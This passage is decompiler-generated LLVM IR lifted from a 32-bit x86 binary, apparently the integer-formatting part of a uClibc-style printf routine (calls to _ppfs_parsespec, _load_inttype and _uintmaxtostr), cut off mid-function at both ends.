  %v3_804e24a = phi i32 [ %v2_804e222, %dec_label_pc_804e226 ], [ %v1_804e242.pre, %dec_label_pc_804e230 ]
  %v0_804e242 = phi i32 [ 0, %dec_label_pc_804e226 ], [ %v4_804e23a, %dec_label_pc_804e230 ]
  %v12_804e242 = icmp eq i32 %v0_804e242, %v3_804e24a
  %v1_804e244 = icmp eq i1 %v12_804e242, false
  %v0_804e72b.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_804e244, label %dec_label_pc_804e72b, label %dec_label_pc_804e24a

dec_label_pc_804e24a:                             ; preds = %dec_label_pc_804e242
  %v1_804e24a = inttoptr i32 %v0_804e72b.pre.pre to i32*
  %v2_804e24a = load i32, i32* %v1_804e24a, align 4
  %v4_804e24a = add i32 %v2_804e24a, %v3_804e24a
  store i32 %v4_804e24a, i32* %v1_804e24a, align 4
  %v0_804e24d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e24d

dec_label_pc_804e24d:                             ; preds = %dec_label_pc_804e222, %dec_label_pc_804e24a
  %v0_804e723 = phi i32 [ %v0_804e226, %dec_label_pc_804e222 ], [ %v0_804e24d.pre, %dec_label_pc_804e24a ]
  %v1_804e24d = inttoptr i32 %v0_804e723 to i8*
  %v2_804e24d = load i8, i8* %v1_804e24d, align 1
  %v3_804e24d = icmp eq i8 %v2_804e24d, 0
  br i1 %v3_804e24d, label %dec_label_pc_804e732, label %dec_label_pc_804e256

dec_label_pc_804e256:                             ; preds = %dec_label_pc_804e24d
  %v1_804e256 = add i32 %v0_804e723, 1
  store i32 %v1_804e256, i32* %edx.global-to-local, align 4
  %v2_804e259 = inttoptr i32 %v1_804e256 to i8*
  %v3_804e259 = load i8, i8* %v2_804e259, align 1
  %v12_804e259 = icmp eq i8 %v3_804e259, 37
  br i1 %v12_804e259, label %dec_label_pc_804e723, label %dec_label_pc_804e263

dec_label_pc_804e263:                             ; preds = %dec_label_pc_804e256
  %v1_804e263 = load i32, i32* @esp, align 4
  %v2_804e263 = add i32 %v1_804e263, 16
  %v3_804e263 = inttoptr i32 %v2_804e263 to i32*
  store i32 %v1_804e256, i32* %v3_804e263, align 4
  %v0_804e267 = load i32, i32* @esp, align 4
  %v1_804e267 = add i32 %v0_804e267, 340
  %v2_804e267 = inttoptr i32 %v1_804e267 to i32*
  store i32 0, i32* %v2_804e267, align 4
  %v0_804e272 = load i32, i32* @esp, align 4
  %v1_804e275 = add i32 %v0_804e272, 16
  store i32 %v1_804e275, i32* @ebx, align 4
  %v2_804e279 = add i32 %v0_804e272, -16
  %v3_804e279 = inttoptr i32 %v2_804e279 to i32*
  store i32 %v1_804e275, i32* %v3_804e279, align 4
  %v0_804e27a = load i32, i32* %stack_var_-364, align 4
  %v1_804e27a = inttoptr i32 %v0_804e27a to i32*
  %v2_804e27a = call i32 @_ppfs_parsespec(i32* %v1_804e27a)
  store i32 %v2_804e27a, i32* %eax.global-to-local, align 4
  %v0_804e27f = load i32, i32* @ebx, align 4
  %v1_804e27f = load i32, i32* @esp, align 4
  %v2_804e27f = inttoptr i32 %v1_804e27f to i32*
  store i32 %v0_804e27f, i32* %v2_804e27f, align 4
  %v0_804e282 = load i32, i32* %stack_var_-364, align 4
  %v1_804e282 = call i32 @_ppfs_setargs(i32 %v0_804e282)
  store i32 %v1_804e282, i32* %eax.global-to-local, align 4
  %v0_804e287 = load i32, i32* @esp, align 4
  %v1_804e287 = add i32 %v0_804e287, 70
  %v2_804e287 = inttoptr i32 %v1_804e287 to i8*
  %v3_804e287 = load i8, i8* %v2_804e287, align 1
  %v4_804e287 = zext i8 %v3_804e287 to i32
  store i32 %v4_804e287, i32* @edi, align 4
  %v1_804e28c = add i32 %v0_804e287, 16
  %v1_804e28f = add i32 %v0_804e287, 56
  %v2_804e28f = inttoptr i32 %v1_804e28f to i32*
  %v3_804e28f = load i32, i32* %v2_804e28f, align 4
  %v1_804e294 = add i32 %v0_804e287, 112
  store i32 %v1_804e294, i32* %edx.global-to-local, align 4
  %tmp67 = icmp slt i32 %v3_804e28f, 1
  br i1 %tmp67, label %dec_label_pc_804e2a1, label %dec_label_pc_804e29a

dec_label_pc_804e29a:                             ; preds = %dec_label_pc_804e263
  %v2_804e29a = zext i8 %v3_804e287 to i32
  %v3_804e29a = mul nuw nsw i32 %v2_804e29a, 12
  store i32 %v3_804e29a, i32* %eax.global-to-local, align 4
  %v2_804e29d = add i32 %v0_804e287, 100
  %v3_804e29d = add i32 %v2_804e29d, %v3_804e29a
  store i32 %v3_804e29d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e2a1

dec_label_pc_804e2a1:                             ; preds = %dec_label_pc_804e263, %dec_label_pc_804e29a
  %v0_804e2a927 = phi i32 [ %v1_804e294, %dec_label_pc_804e263 ], [ %v3_804e29d, %dec_label_pc_804e29a ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804e2a3 = add i32 %v0_804e287, 60
  %v2_804e2a3 = inttoptr i32 %v1_804e2a3 to i32*
  %v3_804e2a3 = load i32, i32* %v2_804e2a3, align 4
  store i32 %v3_804e2a3, i32* %ecx.global-to-local, align 4
  %v2_804e2b480 = sub i32 0, %v3_804e2a3
  %v10_804e2b483 = and i32 %v3_804e2a3, %v2_804e2b480
  %v11_804e2b484 = icmp slt i32 %v10_804e2b483, 0
  %v13_804e2b485 = icmp slt i32 %v2_804e2b480, 0
  %v2_804e2b686 = icmp eq i1 %v13_804e2b485, %v11_804e2b484
  br i1 %v2_804e2b686, label %dec_label_pc_804e2b8, label %dec_label_pc_804e2a9

dec_label_pc_804e2a9:                             ; preds = %dec_label_pc_804e2a1, %dec_label_pc_804e2a9
  %v0_804e2b890 = phi i32 [ %v0_804e2b8, %dec_label_pc_804e2a9 ], [ %v1_804e28c, %dec_label_pc_804e2a1 ]
  %v2_804e2a989 = phi i32 [ %v1_804e2b3, %dec_label_pc_804e2a9 ], [ 0, %dec_label_pc_804e2a1 ]
  %v0_804e2a988 = phi i32 [ %v1_804e2b0, %dec_label_pc_804e2a9 ], [ %v0_804e2a927, %dec_label_pc_804e2a1 ]
  %v3_804e2a9 = mul i32 %v2_804e2a989, 4
  %v4_804e2a9 = add i32 %v0_804e2b890, 344
  %v5_804e2a9 = add i32 %v4_804e2a9, %v3_804e2a9
  %v6_804e2a9 = inttoptr i32 %v5_804e2a9 to i32*
  store i32 %v0_804e2a988, i32* %v6_804e2a9, align 4
  %v0_804e2b0 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e2b0 = add i32 %v0_804e2b0, 12
  store i32 %v1_804e2b0, i32* %edx.global-to-local, align 4
  %v0_804e2b3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e2b3 = add i32 %v0_804e2b3, 1
  store i32 %v1_804e2b3, i32* %eax.global-to-local, align 4
  %v1_804e2b4.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e2b4 = sub i32 %v1_804e2b3, %v1_804e2b4.pre
  %v8_804e2b4 = xor i32 %v1_804e2b3, %v1_804e2b4.pre
  %v9_804e2b4 = xor i32 %v2_804e2b4, %v1_804e2b3
  %v10_804e2b4 = and i32 %v9_804e2b4, %v8_804e2b4
  %v11_804e2b4 = icmp slt i32 %v10_804e2b4, 0
  %v13_804e2b4 = icmp slt i32 %v2_804e2b4, 0
  %v2_804e2b6 = icmp eq i1 %v13_804e2b4, %v11_804e2b4
  %v0_804e2b8 = load i32, i32* @esp, align 4
  br i1 %v2_804e2b6, label %dec_label_pc_804e2b8, label %dec_label_pc_804e2a9

dec_label_pc_804e2b8:                             ; preds = %dec_label_pc_804e2a9, %dec_label_pc_804e2a1
  %v0_804e2b8.lcssa = phi i32 [ %v1_804e28c, %dec_label_pc_804e2a1 ], [ %v0_804e2b8, %dec_label_pc_804e2a9 ]
  %v1_804e2b8 = add i32 %v0_804e2b8.lcssa, 48
  %v2_804e2b8 = inttoptr i32 %v1_804e2b8 to i32*
  %v3_804e2b8 = load i32, i32* %v2_804e2b8, align 4
  store i32 %v3_804e2b8, i32* @ecx, align 4
  %v1_804e2bc = icmp eq i32 %v3_804e2b8, 0
  %v1_804e2be = icmp eq i1 %v1_804e2bc, false
  br i1 %v1_804e2be, label %dec_label_pc_804e2e6, label %dec_label_pc_804e2c0

dec_label_pc_804e2c0:                             ; preds = %dec_label_pc_804e2b8
  %v1_804e2c0 = inttoptr i32 %v0_804e2b8.lcssa to i32*
  %v2_804e2c0 = load i32, i32* %v1_804e2c0, align 4
  store i32 %v2_804e2c0, i32* %eax.global-to-local, align 4
  %v1_804e2c3 = ashr i32 %v2_804e2c0, 31
  store i32 %v1_804e2c3, i32* %edx.global-to-local, align 4
  %v2_804e2c4 = add i32 %v0_804e2b8.lcssa, -4
  %v3_804e2c4 = inttoptr i32 %v2_804e2c4 to i32*
  store i32 %v1_804e2c3, i32* %v3_804e2c4, align 4
  %v0_804e2c5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e2c5 = add i32 %v0_804e2b8.lcssa, -8
  %v3_804e2c5 = inttoptr i32 %v2_804e2c5 to i32*
  store i32 %v0_804e2c5, i32* %v3_804e2c5, align 4
  %v1_804e2c6 = add i32 %v0_804e2b8.lcssa, 32
  %v2_804e2c6 = inttoptr i32 %v1_804e2c6 to i32*
  %v3_804e2c6 = load i32, i32* %v2_804e2c6, align 4
  %v1_804e2ca = and i32 %v3_804e2c6, 3840
  store i32 %v1_804e2ca, i32* %eax.global-to-local, align 4
  %v2_804e2cf = add i32 %v0_804e2b8.lcssa, -12
  %v3_804e2cf = inttoptr i32 %v2_804e2cf to i32*
  store i32 %v1_804e2ca, i32* %v3_804e2cf, align 4
  %v1_804e2d0 = add i32 %v0_804e2b8.lcssa, 344
  %v2_804e2d0 = inttoptr i32 %v1_804e2d0 to i32*
  %v3_804e2d0 = load i32, i32* %v2_804e2d0, align 4
  store i32 %v3_804e2d0, i32* %eax.global-to-local, align 4
  %v1_804e2d7 = inttoptr i32 %v3_804e2d0 to i32*
  %v2_804e2d7 = load i32, i32* %v1_804e2d7, align 4
  %v4_804e2d7 = add i32 %v0_804e2b8.lcssa, -16
  %v5_804e2d7 = inttoptr i32 %v4_804e2d7 to i32*
  store i32 %v2_804e2d7, i32* %v5_804e2d7, align 4
  %v0_804e2d9 = call i32 @_store_inttype()
  store i32 %v0_804e2d9, i32* %eax.global-to-local, align 4
  %v0_804e2de = load i32, i32* @esp, align 4
  %v1_804e2de = add i32 %v0_804e2de, 16
  br label %dec_label_pc_804e718

dec_label_pc_804e2e6:                             ; preds = %dec_label_pc_804e2b8
  %tmp93 = icmp ult i32 %v3_804e2b8, 8
  br i1 %tmp93, label %dec_label_pc_804e2ef, label %dec_label_pc_804e450

dec_label_pc_804e2ef:                             ; preds = %dec_label_pc_804e2e6
  %v1_804e2ef = add i32 %v3_804e2b8, 134570480
  %v2_804e2ef = inttoptr i32 %v1_804e2ef to i8*
  %v3_804e2ef = load i8, i8* %v2_804e2ef, align 1
  %v4_804e2ef = sext i8 %v3_804e2ef to i32
  store i32 %v4_804e2ef, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_804e2fb = icmp eq i8 %v3_804e2ef, 10
  %v1_804e2fe = icmp eq i1 %v9_804e2fb, false
  br i1 %v1_804e2fe, label %dec_label_pc_804e31c, label %dec_label_pc_804e300

dec_label_pc_804e300:                             ; preds = %dec_label_pc_804e2ef
  %v1_804e300 = add i32 %v0_804e2b8.lcssa, 32
  %v2_804e300 = inttoptr i32 %v1_804e300 to i32*
  %v3_804e300 = load i32, i32* %v2_804e300, align 4
  %v1_804e306 = and i32 %v3_804e300, 32
  store i32 %v1_804e306, i32* %eax.global-to-local, align 4
  %tmp68 = udiv i32 %v1_804e306, 32
  %tmp69 = sub nsw i32 45, %tmp68
  store i32 %tmp69, i32* @ebx, align 4
  %v1_804e314 = trunc i32 %v3_804e300 to i8
  %v2_804e314 = and i8 %v1_804e314, 64
  %v3_804e314 = icmp eq i8 %v2_804e314, 0
  %v5_804e314 = zext i8 %v2_804e314 to i32
  %v7_804e314 = and i32 %v3_804e300, -256
  %v8_804e314 = or i32 %v5_804e314, %v7_804e314
  store i32 %v8_804e314, i32* %edx.global-to-local, align 4
  br i1 %v3_804e314, label %dec_label_pc_804e31c, label %dec_label_pc_804e319

dec_label_pc_804e319:                             ; preds = %dec_label_pc_804e300
  %v2_804e319 = or i32 %tmp69, 128
  store i32 %v2_804e319, i32* @ebx, align 4
  br label %dec_label_pc_804e31c

dec_label_pc_804e31c:                             ; preds = %dec_label_pc_804e300, %dec_label_pc_804e2ef, %dec_label_pc_804e319
  %tmp94 = icmp ult i32 %v3_804e2b8, 6
  br i1 %tmp94, label %dec_label_pc_804e321, label %dec_label_pc_804e339

dec_label_pc_804e321:                             ; preds = %dec_label_pc_804e31c
  %v9_804e321 = icmp eq i32 %v3_804e2b8, 3
  %v1_804e324 = icmp eq i1 %v9_804e321, false
  br i1 %v1_804e324, label %dec_label_pc_804e32d, label %dec_label_pc_804e326

dec_label_pc_804e326:                             ; preds = %dec_label_pc_804e321
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_804e33b

dec_label_pc_804e32d:                             ; preds = %dec_label_pc_804e321
  %v9_804e332 = icmp eq i32 %v3_804e2b8, 1
  br i1 %v9_804e332, label %dec_label_pc_804e340, label %dec_label_pc_804e33b

dec_label_pc_804e339:                             ; preds = %dec_label_pc_804e31c
  %v1_804e339 = sub nsw i32 0, %v4_804e2ef
  store i32 %v1_804e339, i32* @esi, align 4
  br label %dec_label_pc_804e33b

dec_label_pc_804e33b:                             ; preds = %dec_label_pc_804e32d, %dec_label_pc_804e326, %dec_label_pc_804e339
  br label %dec_label_pc_804e340

dec_label_pc_804e340:                             ; preds = %dec_label_pc_804e32d, %dec_label_pc_804e33b
  %storemerge105 = phi i32 [ 11, %dec_label_pc_804e33b ], [ 6, %dec_label_pc_804e32d ]
  store i32 %storemerge105, i32* @ebp, align 4
  %v1_804e340 = add i32 %v0_804e2b8.lcssa, 7
  %v2_804e340 = inttoptr i32 %v1_804e340 to i8*
  store i8 32, i8* %v2_804e340, align 1
  %v0_804e345 = load i32, i32* @esp, align 4
  %v1_804e345 = add i32 %v0_804e345, 20
  %v2_804e345 = inttoptr i32 %v1_804e345 to i32*
  %v3_804e345 = load i32, i32* %v2_804e345, align 4
  %v5_804e345 = icmp slt i32 %v3_804e345, 0
  %v1_804e34a = icmp eq i1 %v5_804e345, false
  br i1 %v1_804e34a, label %dec_label_pc_804e354, label %dec_label_pc_804e34c

dec_label_pc_804e34c:                             ; preds = %dec_label_pc_804e340
  %v1_804e34c = add i32 %v0_804e345, 36
  %v2_804e34c = inttoptr i32 %v1_804e34c to i8*
  %v3_804e34c = load i8, i8* %v2_804e34c, align 1
  %v4_804e34c = zext i8 %v3_804e34c to i32
  %v5_804e34c = load i32, i32* %edx.global-to-local, align 4
  %v6_804e34c = and i32 %v5_804e34c, -256
  %v7_804e34c = or i32 %v6_804e34c, %v4_804e34c
  store i32 %v7_804e34c, i32* %edx.global-to-local, align 4
  %v3_804e350 = add i32 %v0_804e345, 7
  %v4_804e350 = inttoptr i32 %v3_804e350 to i8*
  store i8 %v3_804e34c, i8* %v4_804e350, align 1
  %v0_804e354.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e354

dec_label_pc_804e354:                             ; preds = %dec_label_pc_804e340, %dec_label_pc_804e34c
  %v1_804e36d = phi i32 [ %v0_804e345, %dec_label_pc_804e340 ], [ %v0_804e354.pre, %dec_label_pc_804e34c ]
  %v1_804e354 = add i32 %v1_804e36d, 344
  %v2_804e354 = inttoptr i32 %v1_804e354 to i32*
  %v3_804e354 = load i32, i32* %v2_804e354, align 4
  store i32 %v3_804e354, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v1_804e360 = add i32 %v3_804e2b8, -1
  %v8_804e360 = icmp eq i32 %v1_804e360, 0
  store i32 %v1_804e360, i32* %ecx.global-to-local, align 4
  %v0_804e36d.pre = load i32, i32* @edi, align 4
  br i1 %v8_804e360, label %dec_label_pc_804e36d, label %dec_label_pc_804e363

dec_label_pc_804e363:                             ; preds = %dec_label_pc_804e354
  %v2_804e363 = mul i32 %v0_804e36d.pre, 4
  %v3_804e363 = add i32 %v1_804e36d, 52
  %v4_804e363 = add i32 %v3_804e363, %v2_804e363
  %v5_804e363 = inttoptr i32 %v4_804e363 to i32*
  %v6_804e363 = load i32, i32* %v5_804e363, align 4
  %v1_804e367 = and i32 %v6_804e363, 3840
  store i32 %v1_804e367, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e36d

dec_label_pc_804e36d:                             ; preds = %dec_label_pc_804e354, %dec_label_pc_804e363
  %v2_804e36d = add i32 %v1_804e36d, -4
  %v3_804e36d = inttoptr i32 %v2_804e36d to i32*
  store i32 %v0_804e36d.pre, i32* %v3_804e36d, align 4
  %v0_804e36e = load i32, i32* @esi, align 4
  %v2_804e36e = add i32 %v1_804e36d, -8
  %v3_804e36e = inttoptr i32 %v2_804e36e to i32*
  store i32 %v0_804e36e, i32* %v3_804e36e, align 4
  %v0_804e36f = load i32, i32* %eax.global-to-local, align 4
  %v2_804e36f = add i32 %v1_804e36d, -12
  %v3_804e36f = inttoptr i32 %v2_804e36f to i32*
  store i32 %v0_804e36f, i32* %v3_804e36f, align 4
  %v0_804e370 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e370 = add i32 %v1_804e36d, -16
  %v3_804e370 = inttoptr i32 %v2_804e370 to i32*
  store i32 %v0_804e370, i32* %v3_804e370, align 4
  %v0_804e371 = call i32 @_load_inttype()
  %v0_804e376 = load i32, i32* @ebx, align 4
  %v1_804e376 = load i32, i32* @esp, align 4
  %v2_804e376 = inttoptr i32 %v1_804e376 to i32*
  store i32 %v0_804e376, i32* %v2_804e376, align 4
  %v0_804e379 = load i32, i32* @esi, align 4
  %v1_804e379 = load i32, i32* @esp, align 4
  %v2_804e379 = add i32 %v1_804e379, -4
  %v3_804e379 = inttoptr i32 %v2_804e379 to i32*
  store i32 %v0_804e379, i32* %v3_804e379, align 4
  %v0_804e37a = load i32, i32* @edx, align 4
  %v2_804e37a = add i32 %v1_804e379, -8
  %v3_804e37a = inttoptr i32 %v2_804e37a to i32*
  store i32 %v0_804e37a, i32* %v3_804e37a, align 4
  %v2_804e37b = add i32 %v1_804e379, -12
  %v3_804e37b = inttoptr i32 %v2_804e37b to i32*
  store i32 %v0_804e371, i32* %v3_804e37b, align 4
  %v1_804e37c = add i32 %v1_804e379, 347
  store i32 %v1_804e37c, i32* %eax.global-to-local, align 4
  %v2_804e383 = add i32 %v1_804e379, -16
  %v3_804e383 = inttoptr i32 %v2_804e383 to i32*
  store i32 %v1_804e37c, i32* %v3_804e383, align 4
  %v0_804e384 = load i32, i32* %stack_var_-364, align 4
  %v5_804e384 = inttoptr i32 %v0_804e384 to i8*
  %v6_804e384 = call i32 @_uintmaxtostr(i8* %v5_804e384, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804e384, i32* %eax.global-to-local, align 4
  %v0_804e389 = load i32, i32* @esp, align 4
  %v1_804e389 = add i32 %v0_804e389, 32
  store i32 %v6_804e384, i32* @edi, align 4
  %v1_804e38e = add i32 %v0_804e389, 80
  %v2_804e38e = inttoptr i32 %v1_804e38e to i32*
  %v3_804e38e = load i32, i32* %v2_804e38e, align 4
  %tmp95 = icmp ult i32 %v3_804e38e, 6
  br i1 %tmp95, label %dec_label_pc_804e3bc, label %dec_label_pc_804e395

dec_label_pc_804e395:                             ; preds = %dec_label_pc_804e36d
  %v1_804e395 = inttoptr i32 %v6_804e384 to i8*
  %v2_804e395 = load i8, i8* %v1_804e395, align 1
  %v11_804e395 = icmp eq i8 %v2_804e395, 45
  %v1_804e398 = icmp eq i1 %v11_804e395, false
  %v1_804e3a7 = add i32 %v0_804e389, 64
  %v2_804e3a7 = inttoptr i32 %v1_804e3a7 to i32*
  %v3_804e3a7 = load i32, i32* %v2_804e3a7, align 4
  br i1 %v1_804e398, label %dec_label_pc_804e3a7, label %dec_label_pc_804e39a

dec_label_pc_804e39a:                             ; preds = %dec_label_pc_804e395
  %v4_804e39a = or i32 %v3_804e3a7, 2
  store i32 %v4_804e39a, i32* %v2_804e3a7, align 4
  %v0_804e39f = load i32, i32* @edi, align 4
  %v1_804e39f = add i32 %v0_804e39f, 1
  store i32 %v1_804e39f, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_804e3bc.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e3bc

dec_label_pc_804e3a7:                             ; preds = %dec_label_pc_804e395
  store i32 %v3_804e3a7, i32* %eax.global-to-local, align 4
  %v2_804e3ab = and i32 %v3_804e3a7, 2
  %v3_804e3ab = icmp eq i32 %v2_804e3ab, 0
  br i1 %v3_804e3ab, label %dec_label_pc_804e3b3, label %dec_label_pc_804e3af

dec_label_pc_804e3af:                             ; preds = %dec_label_pc_804e3a7
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804e3bc

dec_label_pc_804e3b3:                             ; preds = %dec_label_pc_804e3a7
  %v2_804e3b3 = urem i32 %v3_804e3a7, 2
  %v3_804e3b3 = icmp eq i32 %v2_804e3b3, 0
  br i1 %v3_804e3b3, label %dec_label_pc_804e3bc, label %dec_label_pc_804e3b7

dec_label_pc_804e3b7:                             ; preds = %dec_label_pc_804e3b3
  store i32 4, i32* @ebp, align 4
  br label %dec_label_pc_804e3bc

dec_label_pc_804e3bc:                             ; preds = %dec_label_pc_804e3b3, %dec_label_pc_804e36d, %dec_label_pc_804e3af, %dec_label_pc_804e39a, %dec_label_pc_804e3b7
  %v0_804e40f = phi i32 [ %v6_804e384, %dec_label_pc_804e3b3 ], [ %v6_804e384, %dec_label_pc_804e36d ], [ %v6_804e384, %dec_label_pc_804e3af ], [ %v1_804e39f, %dec_label_pc_804e39a ], [ %v6_804e384, %dec_label_pc_804e3b7 ]
  %v0_804e41e = phi i32 [ %v1_804e389, %dec_label_pc_804e3b3 ], [ %v1_804e389, %dec_label_pc_804e36d ], [ %v1_804e389, %dec_label_pc_804e3af ], [ %v0_804e3bc.pre, %dec_label_pc_804e39a ], [ %v1_804e389, %dec_label_pc_804e3b7 ]
  %v1_804e3bc = add i32 %v0_804e41e, 204
  store i32 %v1_804e3bc, i32* %ecx.global-to-local, align 4
  %v1_804e3c3 = add i32 %v0_804e41e, 20
  %v2_804e3c3 = inttoptr i32 %v1_804e3c3 to i32*
  %v3_804e3c3 = load i32, i32* %v2_804e3c3, align 4
  store i32 %v3_804e3c3, i32* %edx.global-to-local, align 4
  %v2_804e3c7 = sub i32 %v1_804e3bc, %v0_804e40f
  store i32 %v2_804e3c7, i32* %ecx.global-to-local, align 4
  %v2_804e3c9 = icmp slt i32 %v3_804e3c3, 0
  %v1_804e3cb = add i32 %v2_804e3c7, 127
  store i32 %v1_804e3cb, i32* @esi, align 4
  %v1_804e3ce = icmp eq i1 %v2_804e3c9, false
  br i1 %v1_804e3ce, label %dec_label_pc_804e3d5, label %dec_label_pc_804e3d0

dec_label_pc_804e3d0:                             ; preds = %dec_label_pc_804e3bc
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e3d5

dec_label_pc_804e3d5:                             ; preds = %dec_label_pc_804e3bc, %dec_label_pc_804e3d0
  %v0_804e3fb = phi i32 [ %v3_804e3c3, %dec_label_pc_804e3bc ], [ 1, %dec_label_pc_804e3d0 ]
  %v1_804e3d5 = add i32 %v0_804e41e, 32
  %v2_804e3d5 = inttoptr i32 %v1_804e3d5 to i8*
  %v3_804e3d5 = load i8, i8* %v2_804e3d5, align 1
  %v4_804e3d5 = and i8 %v3_804e3d5, 16
  %v5_804e3d5 = icmp eq i8 %v4_804e3d5, 0
  br i1 %v5_804e3d5, label %dec_label_pc_804e40f, label %dec_label_pc_804e3dc

dec_label_pc_804e3dc:                             ; preds = %dec_label_pc_804e3d5
  %v1_804e3dc = add i32 %v0_804e41e, 48
  %v2_804e3dc = inttoptr i32 %v1_804e3dc to i32*
  %v3_804e3dc = load i32, i32* %v2_804e3dc, align 4
  store i32 %v3_804e3dc, i32* %eax.global-to-local, align 4
  %tmp96 = icmp ult i32 %v3_804e3dc, 3
  br i1 %tmp96, label %dec_label_pc_804e3f6.thread, label %dec_label_pc_804e3ea

dec_label_pc_804e3f6.thread:                      ; preds = %dec_label_pc_804e3dc
  store i32 6, i32* @ebp, align 4
  br label %dec_label_pc_804e40f

dec_label_pc_804e3ea:                             ; preds = %dec_label_pc_804e3dc
  %v9_804e3ea = icmp eq i32 %v3_804e3dc, 3
  %v1_804e3ed = icmp eq i1 %v9_804e3ea, false
  br i1 %v1_804e3ed, label %dec_label_pc_804e3f6, label %dec_label_pc_804e3ef

dec_label_pc_804e3ef:                             ; preds = %dec_label_pc_804e3ea
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_804e40f

dec_label_pc_804e3f6:                             ; preds = %dec_label_pc_804e3ea
  %v9_804e3f6 = icmp eq i32 %v3_804e3dc, 4
  %v1_804e3f9 = icmp eq i1 %v9_804e3f6, false
  br i1 %v1_804e3f9, label %dec_label_pc_804e40f, label %dec_label_pc_804e3fb

dec_label_pc_804e3fb:                             ; preds = %dec_label_pc_804e3f6
  %tmp97 = icmp ugt i32 %v0_804e3fb, %v1_804e3cb
  br i1 %tmp97, label %dec_label_pc_804e40f, label %dec_label_pc_804e3ff

dec_label_pc_804e3ff:                             ; preds = %dec_label_pc_804e3fb
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804e404 = inttoptr i32 %v0_804e40f to i8*
  %v2_804e404 = load i8, i8* %v1_804e404, align 1
  %v8_804e404 = icmp eq i8 %v2_804e404, 48
  br i1 %v8_804e404, label %dec_label_pc_804e40f, label %dec_label_pc_804e409

dec_label_pc_804e409:                             ; preds = %dec_label_pc_804e3ff
  %v1_804e409 = add i32 %v2_804e3c7, 128
  store i32 %v1_804e409, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e40f

dec_label_pc_804e40f:                             ; preds = %dec_label_pc_804e3f6.thread, %dec_label_pc_804e3fb, %dec_label_pc_804e3ff, %dec_label_pc_804e3f6, %dec_label_pc_804e3d5, %dec_label_pc_804e3ef, %dec_label_pc_804e409
  %v0_804e447 = phi i32 [ %v0_804e3fb, %dec_label_pc_804e3fb ], [ 1, %dec_label_pc_804e3ff ], [ %v0_804e3fb, %dec_label_pc_804e3f6 ], [ %v0_804e3fb, %dec_label_pc_804e3d5 ], [ %v0_804e3fb, %dec_label_pc_804e3ef ], [ %v1_804e409, %dec_label_pc_804e409 ], [ %v0_804e3fb, %dec_label_pc_804e3f6.thread ]
  %v1_804e40f = inttoptr i32 %v0_804e40f to i8*
  %v2_804e40f = load i8, i8* %v1_804e40f, align 1
  %v8_804e40f = icmp eq i8 %v2_804e40f, 48
  %v1_804e412 = icmp eq i1 %v8_804e40f, false
  br i1 %v1_804e412, label %dec_label_pc_804e43f, label %dec_label_pc_804e414

dec_label_pc_804e414:                             ; preds = %dec_label_pc_804e40f
  %v0_804e414 = load i32, i32* @ebp, align 4
  %v7_804e417 = icmp sgt i32 %v0_804e414, 5
  br i1 %v7_804e417, label %dec_label_pc_804e419, label %dec_label_pc_804e41e

dec_label_pc_804e419:                             ; preds = %dec_label_pc_804e414
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_804e41e

dec_label_pc_804e41e:                             ; preds = %dec_label_pc_804e414, %dec_label_pc_804e419
  %v1_804e41e = add i32 %v0_804e41e, 48
  %v2_804e41e = inttoptr i32 %v1_804e41e to i32*
  %v3_804e41e = load i32, i32* %v2_804e41e, align 4
  %v12_804e41e = icmp eq i32 %v3_804e41e, 1
  %v1_804e423 = icmp eq i1 %v12_804e41e, false
  br i1 %v1_804e423, label %dec_label_pc_804e434, label %dec_label_pc_804e425

dec_label_pc_804e425:                             ; preds = %dec_label_pc_804e41e
  store i32 ptrtoint ([6 x i8]* @global_var_80561d8.192 to i32), i32* @edi, align 4
  store i32 5, i32* @esi, align 4
  br label %dec_label_pc_804e5b0

dec_label_pc_804e434:                             ; preds = %dec_label_pc_804e41e
  %v1_804e434 = icmp eq i32 %v0_804e447, 0
  %v1_804e436 = icmp eq i1 %v1_804e434, false
  br i1 %v1_804e436, label %dec_label_pc_804e43f, label %dec_label_pc_804e438

dec_label_pc_804e438:                             ; preds = %dec_label_pc_804e434
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804e5b0

dec_label_pc_804e43f:                             ; preds = %dec_label_pc_804e434, %dec_label_pc_804e40f
  %v2_804e43f = sub i32 %v0_804e447, %v1_804e3cb
  %v7_804e43f = icmp ult i32 %v0_804e447, %v1_804e3cb
  %v12_804e43f = icmp eq i32 %v2_804e43f, 0
  %v2_804e441 = or i1 %v7_804e43f, %v12_804e43f
  br i1 %v2_804e441, label %dec_label_pc_804e5b0, label %dec_label_pc_804e447

dec_label_pc_804e447:                             ; preds = %dec_label_pc_804e43f
  store i32 %v2_804e43f, i32* @ebx, align 4
  br label %dec_label_pc_804e5ca

dec_label_pc_804e450:                             ; preds = %dec_label_pc_804e2e6
  %tmp98 = icmp ult i32 %v3_804e2b8, 16
  br i1 %tmp98, label %dec_label_pc_804e455, label %dec_label_pc_804e49a

dec_label_pc_804e455:                             ; preds = %dec_label_pc_804e450
  %v1_804e455 = add i32 %v0_804e2b8.lcssa, 33
  %v2_804e455 = inttoptr i32 %v1_804e455 to i8*
  %v3_804e455 = load i8, i8* %v2_804e455, align 1
  %v4_804e455 = and i8 %v3_804e455, 8
